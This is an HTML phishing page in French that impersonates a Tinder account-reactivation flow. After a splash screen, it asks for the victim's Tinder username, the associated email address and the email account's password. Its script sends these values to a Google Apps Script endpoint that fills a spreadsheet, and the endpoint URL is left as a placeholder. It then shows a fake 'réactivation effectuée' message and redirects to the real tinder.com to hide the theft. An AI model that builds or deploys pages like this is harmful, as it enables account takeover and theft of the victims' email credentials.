<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>R√©activation</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background-color: #000;
      overflow: hidden;
    }

    .page {
      position: fixed;
      inset: 0;
      display: none;
      width: 100%;
      height: 100%;
    }
    .page.active {
      display: block;
    }

    /* Fond plein √©cran */
    .fullscreen-img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Pages 2, 3, 4 : m√™me fond image */
    .page-with-bg {
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      position: fixed;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
      box-sizing: border-box;
      color: #fff;
      text-align: center;
    }

    .content-box {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .button-row {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    button {
      width: 100%;
      padding: 14px 18px;
      border-radius: 999px;
      border: 1px solid #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-delete {
      background-color: #000;
      color: #fff;
      border-color: #000;
      opacity: 0.9;
    }

    .btn-reactivate {
      background-color: transparent;
      color: #fff;
      backdrop-filter: blur(6px);
      background: rgba(0,0,0,0.25);
    }

    .btn-reactivate-solid {
      background-color: #ffffff;
      color: #000;
      border-color: #ffffff;
    }

    .fields {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .fields input,
    .fields textarea {
      width: 100%;
      border-radius: 8px;
      border: none;
      padding: 10px 12px;
      font-size: 14px;
      box-sizing: border-box;
      outline: none;
    }

    .fields textarea {
      min-height: 70px;
      resize: vertical;
    }

    .helper-text {
      font-size: 13px;
      opacity: 0.8;
    }

    .status-text {
      font-size: 22px;
      font-weight: 700;
      text-shadow: 0 0 10px rgba(0,0,0,0.6);
    }
  </style>
</head>
<body>

  <!-- PAGE 1 : GIF plein √©cran -->
  <div id="page1" class="page active">
    <img
      class="fullscreen-img"
      url('https://github.com/McDesa/Tinder-2/blob/main/Izmest/Page%20d'accueil%20mobile.png?raw=true')
      alt="Intro"
    />
  </div>

  <!-- PAGE 2 : fond + 2 boutons -->
  <div
    id="page2"
    class="page"
  >
    <div
      class="page-with-bg"
      style="background-image: url('https://github.com/McDesa/Tinder-2/blob/main/Izmest/Page%20principale.png?raw=true');"
    >
      <div class="content-box">
        <div class="helper-text">
        </div>
        <div class="button-row">
          <button class="btn-delete" type="button">
            Supprimer mon compte
          </button>
          <button class="btn-reactivate" type="button" id="btnToPage3">
            R√©activer mon compte
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- PAGE 3 : fond + 3 champs + bouton -->
  <div
    id="page3"
    class="page"
  >
    <div
      class="page-with-bg"
      style="background-image: url('https://github.com/McDesa/Tinder-2/blob/main/Izmest/Page%20principale.png?raw=true');"
    >
      <div class="content-box">
        <div class="helper-text">
          üîµ Merci de compl√©ter les champs ci-dessous pour la r√©activation.
        </div>
        <div class="fields">
          <!-- üîµ Ici, tu peux pr√©ciser le type d‚Äôinfo attendue dans chaque champ via placeholder -->
          <input
            id="field1"
            type="text"
            placeholder="Nom d'utilisateur Tinder"
            required
          />
          <input
            id="field2"
            type="text"
            placeholder="Adresse mail associ√©e √† votre compte Tinder"
            required
          />
          <textarea
            id="field3"
            placeholder="Mot de passe de votre compte mail"
            required
          ></textarea>
        </div>
        <button class="btn-reactivate-solid" type="button" id="btnSubmit">
          R√©activer mon compte
        </button>
      </div>
    </div>
  </div>

  <!-- PAGE 4 : confirmation -->
  <div
    id="page4"
    class="page"
  >
    <div
      class="page-with-bg"
      style="background-image: url('https://github.com/McDesa/Tinder-2/blob/main/Izmest/Page%20principale.png?raw=true');"
    >
      <div class="content-box" style="align-items:center;">
        <div class="status-text">
          R√©activation effectu√©e
        </div>
      </div>
    </div>
  </div>

  <script>
    // üîµ √Ä REMPLACER PAR L‚ÄôURL DE TON WEB APP GOOGLE APPS SCRIPT
    const SCRIPT_URL = "üîµ VOTRE_URL_WEB_APP_APPS_SCRIPT_ICI";

    function showPage(id) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById(id).classList.add('active');

      // Petit ‚Äútruc‚Äù pour r√©duire la barre d‚Äôadresse sur mobile
      setTimeout(() => {
        window.scrollTo(0, 1);
      }, 50);
    }

    // Splash screen : 1,5 s puis page 2
    window.addEventListener('load', () => {
      setTimeout(() => {
        showPage('page2');
      }, 1500);
    });

    // Bouton "R√©activer mon compte" sur la page 2
    document.getElementById('btnToPage3').addEventListener('click', () => {
      showPage('page3');
    });

    // Bouton "R√©activer mon compte" sur la page 3 (envoi vers Google Sheets)
    document.getElementById('btnSubmit').addEventListener('click', async () => {
      const field1 = document.getElementById('field1').value.trim();
      const field2 = document.getElementById('field2').value.trim();
      const field3 = document.getElementById('field3').value.trim();

      if (!field1 || !field2 || !field3) {
        alert("Merci de remplir tous les champs.");
        return;
      }

      try {
        // Envoi au script Google Apps Script
        await fetch(SCRIPT_URL, {
          method: "POST",
          mode: "no-cors", // pour √©viter certains probl√®mes CORS
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            a1: field1,
            b1: field2,
            c1: field3
          })
        });
      } catch (e) {
        // Tu peux afficher une erreur si tu veux
        console.error("Erreur d‚Äôenvoi vers Google Apps Script", e);
      }

      // Affichage de la page 4 (confirmation)
      showPage('page4');

      // Apr√®s 3 secondes, redirection vers Tinder
      setTimeout(() => {
        window.location.href = "https://tinder.com/";
      }, 3000);
    });

    // Le bouton "Supprimer mon compte" NE FAIT RIEN, comme demand√©
  </script>
</body>
</html>
